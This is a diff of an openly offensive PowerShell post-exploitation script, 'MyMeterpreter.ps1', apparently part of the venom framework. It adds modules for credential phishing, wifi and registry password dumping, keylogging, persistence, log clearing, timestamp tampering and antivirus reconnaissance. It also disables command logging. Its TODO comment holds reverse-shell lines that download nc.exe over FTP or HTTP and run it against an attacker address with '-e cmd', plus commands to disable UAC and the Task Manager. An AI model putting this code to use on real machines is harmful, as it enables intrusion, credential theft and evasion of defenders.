@@ -3,10 +3,10 @@
    CmdLet to assiste reverse tcp shells in post-exploitation
 
    Author: r00t-3xp10it
-   Tested Under: Windows 10 x64 bits
+   Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.0.2
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
@@ -19,112 +19,20 @@
    Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..
 
 .NOTES
-   blablabla
+   Most of the CmdLines used in this CmdLet can be found in this Venom v1.0.17.7 wiki page: 
+   https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
 
 .EXAMPLE
    PS C:\> Get-Help .\MyMeterpreter.ps1 -full
    Access This CmdLet Comment_Based_Help
 
 .EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Parameters List
-   List Some CmdLet Parameters Available
+   PS C:\> .\MyMeterpreter.ps1 -Help parameters
+   List all CmdLet parameters available
 
 .EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum|Verbose
-   SystemInfo Fast OR Detailed Enumeration
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
-   Enumerate Remote Host Active TCP Connections
-
-.EXAMPLE
-   PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
-   Enumerate Remote Host Applications Installed
-
-.EXAMPLE
-   PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum|Kill
-   Enumerate OR Kill Remote Host Running Process(s)
-
-.EXAMPLE
-   PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum|Kill -ProcessName firefox.exe
-   Enumerate OR Kill Remote Host firefox.exe Process(s)
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
-   Enumerate Remote Host Running Tasks
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum|ScanAll
-   Identify Installed Browsers and Versions OR ScanAll (Enum)
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
-   Capture 1 Desktop Screenshot and Store it on %TMP%
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 2
-   Capture 5 Desktop Screenshots with 2 secs delay between captures.
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Camera Enum|Snap
-   List Device Names OR take screenshot with default camera
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
-   Downloads webserver.ps1 to %TMP% and executes the WebServer.
-   Remark: This Module uses Social Enginnering to trick remote host into
-   installing python (python http.server) if remote host does not have it.
-   Access WebServer: http://<RHOST>:8080/
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
-   Downloads webserver.ps1 and executes the webserver on port 8087
-   Access WebServer: http://<RHOST>:8087/
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
-   Downloads Start-WebServer.ps1 to %TMP% and executes the webserver.
-   Remark: Admin privileges are requiered in shell to run the WebServer
-   Access WebServer: http://<RHOST>:8080/
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
-   Downloads Start-WebServer.ps1 and executes the webserver on port 8087
-   Remark: Admin privileges are requiered in shell to run the WebServer
-   Access WebServer: http://<RHOST>:8087/
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Keylogger Start|Stop
-   Download/Execute void.exe in child process to capture keystrokes
-   OR Stops keylogger and delete all respective files\logs left behind.
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 10
-   Capture Screenshots of remote Mouse Clicks for 10 seconds
-   And store the capture under '$Env:TMP' remote directory.
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
-   Promp the current user for a valid credential.
-   Remark: This CmdLet interrupts EXPLORER process until a valid credential
-   is entered correctly in Windows PromptForCredential MsgBox, only them it
-   starts EXPLORER process and leaks the credentials on this terminal shell.
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -EOP Default|ScanAll
-   Find Missing Software Patchs for Privilege Escalation
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Persiste $Env:USERPROFILE\Coding\PSwork\Client.ps1 -BeaconTime 10
-   Execute Client.ps1 at StartUp with 10 sec of interval between executions
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
-   Stops wscript process (vbs) and delete persistence script
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
-   Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
+   PS C:\> .\MyMeterpreter.ps1 -Help [ Parameter Name ]
+   Detailed information about Selected Parameter
 
 .INPUTS
    None. You cannot pipe objects into MyMeterpreter.ps1
@@ -158,36 +66,56 @@
 
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$StartDir="$Env:USERPROFILE",
+   [string]$TaskName="MyMeterpreter",
    [string]$StartWebServer="false",
    [string]$GetConnections="false",
+   [string]$WifiPasswords="false",
    [string]$GetInstalled="false",
+   [string]$GetPasswords="false",
    [string]$Mouselogger="false",
    [string]$Destination="false",
    [string]$GetBrowsers="false",
    [string]$ProcessName="false",
+   [string]$CleanTracks="false",
+   [string]$GetDnsCache="false",
    [string]$Parameters="false",
    [string]$PhishCreds="false",
    [string]$GetProcess="false",
    [string]$ApacheAddr="false",
+   [string]$Storage="$Env:TMP",
+   [string]$SpeakPrank="false",
    [string]$Keylogger="false",
+   [string]$FileMace="false",
    [string]$GetTasks="false",
    [string]$Persiste="false",
+   [string]$BruteZip="false",
    [string]$SysInfo="false",
+   [string]$PassList="null",
+   [string]$GetLogs="false",
    [string]$Upload="false",
    [string]$Camera="false",
+   [string]$Date="false",
+   [string]$Exec="false",
+   [string]$Help="false",
    [string]$EOP="false",
    [int]$BeaconTime='10',
    [int]$Screenshot='0',
+   [int]$Interval='10',
    [int]$SPort='8080',
+   [int]$NewEst='10',
    [int]$Timmer='10',
-   [int]$Delay='1'
+   [int]$Volume='88',
+   [int]$Delay='1',
+   [int]$Rate='1'
 )
 
 
-## Variable declarations
-$CmdletVersion = "v1.0.2"
+## Global Variable declarations
+$CmdletVersion = "v1.0.4"
 $Remote_hostName = (hostname)
 $Working_Directory = (pwd).Path
+$OsVersion = [System.Environment]::OSVersion.Version
 $host.UI.RawUI.WindowTitle = "@MyMeterpreter $CmdletVersion {SSA@RedTeam}"
 $Address = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
 $Banner = @"
@@ -197,92 +125,125 @@ $Banner = @"
 |  \/  |\ \/ /|  \/  || ===||_   _|| ===|| () )| ()_)| () )| ===||_   _|| ===|| () )
 |_|\/|_| |__| |_|\/|_||____|  |_|  |____||_|\_\|_|   |_|\_\|____|  |_|  |____||_|\_\    
               Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
-                   CmdLet Help: .\MyMeterpreter.ps1 -Parameters List
+                   CmdLet Help: .\MyMeterpreter.ps1 -Help Parameters
 
       
 "@;
 Clear-Host
 Write-Host "$Banner" -ForegroundColor Blue
+## Disable Powershell Command Logging for current session.
+Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+$HiddePublicIPaddr = $False ## manual => enable|disable Public-IP displays
 
 
 <# TODO:
 
-.SYNOPSIS
-   Clean files\temp
+   ## Search for creds on registry
+   # credits: https://hack-o-crack.blogspot.com/2009/10/applications-saved-password-location-in.html
+   reg query HKLM /f password /t REG_SZ /s
+   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon DefaultPassword
 
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -CleanTracks True
+   ## Links
+   https://github.com/akizaizinski1311/Disable-Windows-Defender/blob/main/source.bat
+   https://github.com/xct/xc/tree/master/vulns <--- 2020 CVEs
+    
+   ## FTP
+   (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
 
+   ## Certuil decode routine
+   If((Test-Path -Path "$env:TEMP\nc.exe.txt") -ne $true -and (Test-Path -Path "$env:TEMP\nc.exe") -ne $true){
+      Start-BitsTransfer -Source 'https://raw.githubusercontent.com/securethelogs/Powershell/master/Tools/nc.exe'-Destination $env:TEMP\nc.exe.txt
+      certutil -decode $env:TEMP\nc.exe.txt $env:TEMP\nc.exe
 
+      $downnet = Test-Path -Path $env:TEMP\nc.exe -ErrorAction SilentlyContinue
+      If($downnet -eq $true){
+         Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop $env:TEMP\nc.exe $atk $port -e cmd.exe"
+      }
+   }
 
-.SYNOPSIS
-   Dump Wifi SSID passwords ???
-   .\SSIDPassDump.ps1 -DumpType Terminal
-
-.EXAMPLE
-   PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Enum|Dump
-
-
+   ## Open webbrowser in sellected url
    cmd /R start /max microsoft-edge:https://mrdoob.com/projects/chromeexperiments/google-sphere
 
-   ## Speak Frase: '$MYSpeak' Remotely
-   $My_Line = "$MYSpeak"
-   Add-Type -AssemblyName System.speech
-   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
-   $speak.Volume = 85;$speak.Rate = -2
-   $speak.Speak($My_Line)
+   ## disable UAC
+   Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force
+
+   ## DISABLE\ENABLE TASKMANAGER (Admin)
+   cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;cmd /c taskkill /F /IM explorer.exe;start explorer.exe
+   cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 0 /f;cmd /c taskkill /F /IM explorer.exe;start explorer.exe
+
 #>
 
-If($Parameters -ieq "List"){
+
+If($Help -ieq "Parameters"){
 
    <#
    .SYNOPSIS
       Helper - List CmdLet Parameters Available
       
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Parameters List
+      PS C:\> .\MyMeterpreter.ps1 -Help Parameters
    #>
 
 Write-Host "  Syntax : .\MyMeterpreter.ps1 [ -Parameter ] [ Argument ]"
-Write-Host "  Example: .\MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2 -Delay 5`n"
-Write-Host "  Parameters        Arguments            Description" -ForegroundColor Green
+Write-Host "  Example: .\MyMeterpreter.ps1 -SysInfo Verbose -Screenshot 2 -Delay 5 "
+Write-Host "`n  P4rameters        @rguments            Descripti0n" -ForegroundColor Green
 Write-Host "  ---------------   ------------         ---------------------------------------"
 $ListParameters = @"
-  -SysInfo          Enum|Verbose         SystemInfo Fast OR Detailed Enumeration
+  -SysInfo          Enum|Verbose         System Info Quick OR Verbose Enumeration
   -GetConnections   Enum                 Enumerate Remote Host Active TCP Connections
+  -GetDnsCache      Enum                 Enumerate remote host DNS cache entrys
   -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
   -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
-  -ProcessName      firefox.exe          Used together with [ -GetProcess Enum|Kill ]
-  -GetTasks         Enum                 Enumerate Remote Host Running Tasks
-  -GetBrowsers      Enum|ScanAll         Enumerate Installed Browsers and Versions OR ScanAll 
+  -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
+  -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
+  -GetBrowsers      Enum|Verbose         Enumerate Installed Browsers and Versions OR Verbose 
   -Screenshot       1                    Capture 1 Desktop Screenshot and Store it on %TMP%
-  -Delay            2                    Used together with [ -Screenshot 1|2|3|4|etc ] switch
-  -Camera           Enum|Snap            Enum computer cameras OR capture default camera screenshot 
+  -Camera           Enum|Snap            Enum computer webcams OR capture default webcam snapshot 
   -StartWebServer   Python|Powershell    Downloads webserver to %TMP% and executes the WebServer.
-  -SPort            8080                 Used together with [ -StartWebServer Python|Powershell ]
   -Keylogger        Start|Stop           Start OR Stop recording remote host keystrokes
   -MouseLogger      Start                Capture Screenshots of Mouse Clicks for 10 seconds
-  -Timmer           10                   Used together with [ -MouseLogger Start ] switch
   -PhishCreds       Start                Promp current user for a valid credential and leak captures
-  -EOP              Default|ScanAll      Find Missing Software Patchs for Privilege Escalation
-  -WifiPasswords    Enum|Dump            Enum Available SSIDs OR Dump all Wifi SSID passwords
+  -GetPasswords     Enum|Dump            Enumerate passwords of diferent locations (Store|Regedit|Disk) 
+  -WifiPasswords    Dump|ZipDump         Enum Available SSIDs OR ZipDump All Wifi passwords
+  -EOP              Enum|Verbose         Find Missing Software Patchs for Privilege Escalation
+  -BruteZip         `$Env:TMP\arch.zip    Brute force Zip archives with the help of 7z.exe
   -Upload           script.ps1           Upload script.ps1 from attacker apache2 webroot
-  -ApacheAddr       192.168.1.73         Used together with [ -Upload script.ps1 ] switch
-  -Destination      `$Env:TMP\script.ps1  Used together with [ -Upload script.ps1 ] switch
   -Persiste         `$Env:TMP\script.ps1  Persiste script.ps1 on every startup (BeaconHome)
-  -BeaconTime       10                   Used together with [ -Persiste ] switch (BeaconTime)
+  -CleanTracks      Clear|Paranoid       Clean disk artifacts left behind (clean system tracks)
+  -FileMace         `$Env:TMP\test.txt    Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
+  -SpeakPrank       "Hello World."       Make remote host speak user input sentence (prank)
 
 "@;
 Write-Host "$ListParameters"
+Write-Host "  Help: .\MyMeterpreter.ps1 -Help [ Parameter Name ]                    " -ForeGroundColor black -BackGroundColor White
+Write-Host ""
 }
 
-If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){## <-- TODO: finish Verbose @Argument
+If($GetDnsCache -ieq "Enum"){
 
    <#
    .SYNOPSIS
-      Helper - SysInfo module enumerates remote host
-      basic system info sutch as: IpAddress, OsVersion
-      OsFlavor, OsArchitecture, WorkingDirectory, Etc..
+      Helper - Enumerate remote host DNS cache entrys
+      
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+   #>
+
+   Get-DNSClientCache|Select-Object Entry,Data|Format-Table -AutoSize
+   Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
+
+   <#
+   .SYNOPSIS
+      Helper - Enumerates remote host basic system info
+
+   .NOTES
+      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
+      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
+      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
+      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..
 
    .EXAMPLE
       PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum
@@ -294,63 +255,463 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){## <-- TODO: finish Verbose
    #>
 
    ## Variable declarations
-   $Name = (Get-WmiObject Win32_OperatingSystem).CSName
    $Processor = (Get-WmiObject Win32_processor).Caption
    $System = (Get-WmiObject Win32_OperatingSystem).Caption
    $Version = (Get-WmiObject Win32_OperatingSystem).Version
-   $syst_dir = (Get-WmiObject Win32_OperatingSystem).SystemDirectory
+   $NameDomain = (Get-WmiObject Win32_OperatingSystem).CSName
+   $IsVirtualMachine = (Get-MpComputerStatus).IsVirtualMachine
+   $SystemDir = (Get-WmiObject Win32_OperatingSystem).SystemDirectory
    $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
-   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544");
-   If($IsClientAdmin){$ShellPrivileges = "Admin"}Else{$ShellPrivileges = "UserLand"}
+   $Publicip = (curl http://ipinfo.io/ip -UseBasicParsing).content ## Credits: @securethelogs
+   $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+   $UserAgentString = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\internet settings" -Name 'User Agent' -ErrorAction SilentlyContinue|Select-Object -ExpandProperty 'User Agent'
+   If($IsClientAdmin){$ShellPrivs = "Admin"}Else{$ShellPrivs = "UserLand"}
+
+   ## Get default webbrowser
+   $DefaultBrowser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice' -ErrorAction SilentlyContinue).ProgId
+   If($DefaultBrowser){
+      $Parse_Browser_Data = $DefaultBrowser.split("-")[0] -replace 'URL','' -replace 'HTML','' -replace '.HTTPS',''
+   }Else{
+      $Parse_Browser_Data = "Not Found"
+   }
 
    ## Build OutPut Table
-   Write-Host "  OS: $System" -ForegroundColor Green
-   Write-Host "  -----------------------------";Start-Sleep -Seconds 1
-   Write-Host "  ShellPrivs   : $ShellPrivileges" -ForegroundColor Yellow
-   Write-Host "  DomainName   : $Name"
-   Write-Host "  Architecture : $Architecture"
-   Write-Host "  OSVersion    : $Version"
-   Write-Host "  IPAddress    : $Address"
-   Write-Host "  System32     : $syst_dir"
-   Write-Host "  WorkingDir   : $Working_Directory" -ForegroundColor Yellow
-   Write-Host "  Processor    : $Processor"
+   Write-Host "OS: $System " -ForegroundColor Green
+   Write-Host "------------------------------";Start-Sleep -Seconds 1
+   Write-Host "ShellPrivs        : $ShellPrivs" -ForegroundColor Yellow
+   Write-Host "IsVirtualMachine  : $IsVirtualMachine"
+   Write-Host "DomainName        : $NameDomain"
+   Write-Host "Architecture      : $Architecture"
+   Write-Host "OSVersion         : $Version"
+   Write-Host "IPAddress         : $Address"
+   If($HiddePublicIPaddr -eq $False){## Display Public IpAdrr
+      Write-Host "PublicIP          : $Publicip"
+   }
+   Write-Host "System32          : $SystemDir"
+   Write-Host "DefaultWebBrowser : $Parse_Browser_Data (predefined)"
+   Write-Host "WorkingDir        : $Working_Directory" -ForegroundColor Yellow
+   Write-Host "Processor         : $Processor"
+   Write-Host "User-Agent        : $UserAgentString`n"
+
+
+   ## Get current logged on user
+   whoami /USER > $Env:TMP\UserInfo.log
+   $parsedata = Get-Content -Path "$Env:TMP\UserInfo.log"
+   If(-not($parsedata) -or $parsedata -ieq $null){## None output from whoami /USER comm
+      Write-Host "[error] None User Information found!" -ForegroundColor Red -BackgroundColor Black
+   }Else{## Parsing whoami /user data
+     $GetUserInfo = $parsedata -replace 'USER INFORMATION','' -replace '----------------','' -replace '=','-'|Where {$_ -ne ""}
+     Write-Host "";echo $GetUserInfo;Write-Host ""
+   }
+
+   ## Get ALL drives available
+   Get-PsDrive -PsProvider filesystem|Select-Object Name,Root,CurrentLocation,Used,Free|Format-Table -AutoSize
+
+   ## Get User Accounts
+   Write-Host "User accounts for \\$Env:COMPUTERNAME" -ForegroundColor Green
+   Write-Host "-----------------------------------------------------------------"
+   Get-LocalUser|Select-Object Name,Enabled,PasswordRequired,UserMayChangePassword -EA SilentlyContinue|Format-Table
 
 
    ## Detailed Enumeration function
-   If($SysInfo -ieq "Verbose"){## <---- TODO:
-      Write-Host ""
-      Start-Sleep -Seconds 1
-      Write-Host "[i] Under Develop ..."
+   If($SysInfo -ieq "Verbose"){
+
+      $Constrained = $ExecutionContext.SessionState.LanguageMode
+      If($Constrained -ieq "ConstrainedLanguage"){
+        $ConState = "Active"
+      }Else{
+        $ConState = "Inactive"
+      }
+
+      ## Local Function variable declarations
+      $PSHistoryStatus = (Get-PSReadlineOption).HistorySavePath
+      $AMProductVersion = (Get-MpComputerStatus).AMProductVersion
+      $AMServiceEnabled = (Get-MpComputerStatus).AMServiceEnabled
+      $AntivirusEnabled = (Get-MpComputerStatus).AntivirusEnabled
+      $IsTamperProtected = (Get-MpComputerStatus).IsTamperProtected
+      $AntispywareEnabled = (Get-MpComputerStatus).AntispywareEnabled
+      $DisableScriptScanning = (Get-MpPreference).DisableScriptScanning
+      $SignatureScheduleTime = (Get-MpPreference).SignatureScheduleTime
+      $BehaviorMonitorEnabled = (Get-MpComputerStatus).BehaviorMonitorEnabled
+      $RealTimeProtectionEnabled = (Get-MpComputerStatus).RealTimeProtectionEnabled
+      $AllowedApplications = (Get-MpPreference).ControlledFolderAccessAllowedApplications
+      $AntivirusSignatureLastUpdated = (Get-MpComputerStatus).AntivirusSignatureLastUpdated
+      $AntispywareSignatureLastUpdated = (Get-MpComputerStatus).AntispywareSignatureLastUpdated
+      $AntiVirusProduct = (Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct").displayName
+
+      <#
+      .NOTES
+        MyMeterpreter.ps1 Disables PS Command Logging in current session
+        (while this terminal console is open). The next variable declaration
+        displays to CmdLet users if the setting has sucessfuly modified ...
+        Remark: PSCommandLogging will be restarted to default at CmdLet exit.
+      #> $PSLoggingSession = (Get-PSReadlineOption).HistorySaveStyle #<--
+
+      ## Get UAC settings {Notify Me, Never Notify, Allways Notify }
+      # Credits: https://winaero.com/how-to-change-uac-settings-in-windows-10/
+      $UacStatus = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').EnableLUA
+      $ConsentPromptBehaviorAdmin = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorAdmin
+      $ConsentPromptBehaviorUser = (Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system').ConsentPromptBehaviorUser
+
+      ## Parse UAC Reg Data
+      If($ConsentPromptBehaviorAdmin -ieq "5" -and $ConsentPromptBehaviorUser -ieq "3"){
+        $UacSettings = "Notify Me" ## Defaul value
+      }ElseIf($ConsentPromptBehaviorAdmin -ieq "0" -and $ConsentPromptBehaviorUser -ieq "0"){
+        $UacSettings = "Never Notify"
+      }ElseIf($ConsentPromptBehaviorAdmin -ieq "2" -and $ConsentPromptBehaviorUser -ieq "3"){
+        $UacSettings = "Allways Notify"
+      }Else{## Can NOT retrive reg value
+         $UacSettings = "`$null"
+      }
+
+      If($UacStatus -ieq "0"){## disabled
+         $UacStatus = "False"
+      }ElseIf($UacStatus -ieq "1"){## enabled
+         $UacStatus = "True"
+      }Else{## Can NOT retrive reg value
+         $UacStatus = "`$null"
+      }
+
+      ## Get Credentials from Guard Status
+      If($OsVersion.Major -ge 10){## Not Supported on Windows >= 10
+         $RegPath = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA"
+         $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -EA SilentlyContinue -ErrorVariable GetItemPropertyError
+         If(-not($GetItemPropertyError)){
+            If(-not($Null -eq $Result.LsaCfgFlags)){
+               If($Result.LsaCfgFlags -eq 0){
+                   $Status = "disabled"
+                   $Description = "Credential Guard is disabled!"
+               }ElseIf($Result.LsaCfgFlags -eq 1){
+                   $Status = "enabled"
+                   $Description = "Credential Guard is enabled with UEFI lock!"
+               }ElseIf($Result.LsaCfgFlags -eq 2){
+                   $Status = "enabled"
+                   $Description = "Credential Guard is enabled without UEFI lock!"
+               } 
+            }Else{
+               $Status = "disabled"
+               $Description = "Credential Guard is not configured!"
+            }
+         }
+      }Else{
+        $Status = "disabled"
+        $Description = "Credential Guard is not supported on this OS!"
+      }
+
+      ## Built Output Table
+      Write-Host "AV: Credential Guard Status" -ForegroundColor Green
+      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      write-host "Name        : Credential Guard"
+      write-host "Status      : $Status" -ForegroundColor Yellow
+      write-host "Description : $Description"
+      
+
+      ## Built Output Table
+      Write-Host "`n`nDefault AV: $AntiVirusProduct" -ForegroundColor Green
+      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      Write-Host "UACEnabled                      : $UacStatus"
+      Write-Host "UACSettings                     : $UacSettings"
+      Write-Host "AMProductVersion                : $AMProductVersion"
+      Write-Host "AMServiceEnabled                : $AMServiceEnabled"
+      Write-Host "AntivirusEnabled                : $AntivirusEnabled" -ForegroundColor Yellow
+      Write-Host "IsTamperProtected               : $IsTamperProtected"
+      Write-Host "AntispywareEnabled              : $AntispywareEnabled"
+      Write-Host "DisableScriptScanning           : $DisableScriptScanning"
+      Write-Host "BehaviorMonitorEnabled          : $BehaviorMonitorEnabled"
+      Write-Host "RealTimeProtectionEnabled       : $RealTimeProtectionEnabled" -ForegroundColor Yellow
+      Write-Host "ConstrainedLanguage             : $ConState"
+      Write-Host "SignatureScheduleTime           : $SignatureScheduleTime"
+      Write-Host "AntivirusSignatureLastUpdated   : $AntivirusSignatureLastUpdated"
+      Write-Host "AntispywareSignatureLastUpdated : $AntispywareSignatureLastUpdated"
+      Write-Host "PowerShellCommandLogging        : $PSLoggingSession"  -ForegroundColor Yellow
+
+      ## Loop truth $AllowedApplications
+      # Make sure the var declaration is not empty
+      If(-not($AllowedApplications -ieq $null)){
+         ForEach($Token in $AllowedApplications){
+            Write-Host "AllowedApplications             : $Token"
+         }
+      }
+
+      ## Enumerate active SMB shares
+      Write-Host "`n`nEnumerating SMB shares" -ForegroundColor Green
+      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      Get-SmbShare -EA SilentlyContinue|Select-Object Name,Path,Description|Format-Table
+      If(-not($?)){## Make sure we have any results back
+         Write-Host "[error] None SMB shares found under $Remote_hostName system!" -ForegroundColor Red -BackgroundColor Black
+      }
+
+      ## @Webserver Working dir ACL Description
+      Write-Host "`n`nDCALC: Working Directory" -ForegroundColor Green
+      Write-Host "------------------------------";Start-Sleep -Seconds 1
+      $GetACLDescription = icacls "$Working_Directory"|findstr /V "processing"
+      echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
+      Remove-Item -Path "$Env:TMP\ACl.log" -Force
+
+      ## Recently typed "run" commands
+      Write-Host "`nRUNMRU: Recently 'run' commands" -ForegroundColor Green
+      Write-Host "-------------------------------";Start-Sleep -Seconds 1
+      $GETMRUList = reg query HKCU\software\microsoft\windows\currentversion\explorer\runmru|findstr /V "(Default)"|findstr /V "MRUList"
+      If(-not($GETMRUList -Match "REG_SZ")){## Make sure $GETMRUList variable its not empty
+         Write-Host "[error] None RunMru registry entrys found!" -ForegroundColor Red -BackgroundColor Black
+      }Else{## RunMru registry entrys found
+         $GETMRUList -replace '\\1','' -replace 'REG_SZ','' -replace 'HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\explorer\\runmru',''|? {$_.trim() -ne ""}
+      }
+
+      <#
+      ## Get Firewall rules {Enabled $True Profile $Any}
+      Write-Host "`n`nList firewall rules {any}"
+      Write-Host "---------------------------------";Start-Sleep -Seconds 1
+      Get-NetFirewallRule|Where-Object {## Rules to filter {Enabled=true|Profile=any}
+         $_.Enabled -ieq "True" -and $_.Profile -ieq "Any" -and $_.DisplayName -ne "Início"
+      }|Format-Table Enabled,Profile,action,Description
+      #>
+
+
+      ## TobeContinued ..
    }
    Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($SpeakPrank -ne "False"){
+If($Rate -gt '10'){$Rate = "10"} ## Speach speed max\min value accepted
+If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted
+
+   <#
+   .SYNOPSIS
+      Helper - Speak Prank {SpeechSynthesizer}
+
+   .DESCRIPTION
+      Make remote host speak user input sentence (prank)
+
+   .NOTES
+      Required Dependencies: SpeechSynthesizer {native}
+      Remark: Double Quotes are Mandatory in @arg declarations
+      Remark: -Volume controls the speach volume {default: 88}
+      Remark: -Rate Parameter configs the SpeechSynthesizer speed
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World"
+      Make remote host speak "Hello World" {-Rate 1 -Volume 88}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
+
+   .OUTPUTS
+      RemoteHost SpeachSpeed Volume Speak        
+      ---------- ----------- ------ -----        
+      SKYNET     1           88     'hello world'
+   #>
+
+   ## Local Function Variable declarations
+   $TimeDat = Get-Date -Format 'HH:mm:ss'
+   $RawRate = "-" + "$Rate" -Join ''
+
+   ## Create Data Table for output
+   $mytable = New-Object System.Data.DataTable
+   $mytable.Columns.Add("RemoteHost")|Out-Null
+   $mytable.Columns.Add("SpeachSpeed")|Out-Null
+   $mytable.Columns.Add("Volume")|Out-Null
+   $mytable.Columns.Add("Speak")|Out-Null
+   $mytable.Rows.Add("$Remote_hostName",
+                     "$Rate",
+                     "$Volume",
+                     "'$SpeakPrank'")|Out-Null
+
+   ## Display Data Table
+   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
+   Get-Content -Path "$Env:TMP\MyTable.log"
+   Remove-Item -Path "$Env:TMP\MyTable.log" -Force
+
+   ## Add type assembly
+   Add-Type -AssemblyName System.speech
+   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+   $speak.Volume = $Volume
+   $speak.Rate = $RawRate
+   $speak.Speak($SpeakPrank)
 }
 
 If($GetConnections -ieq "Enum"){
 
    <#
    .SYNOPSIS
-      Helper - Enumerate Active TCP Connections
-      
+      Author: @itm4n|@r00t-3xp10it
+      Helper - Gets a list of listening ports (TCP)
+   
+   .DESCRIPTION
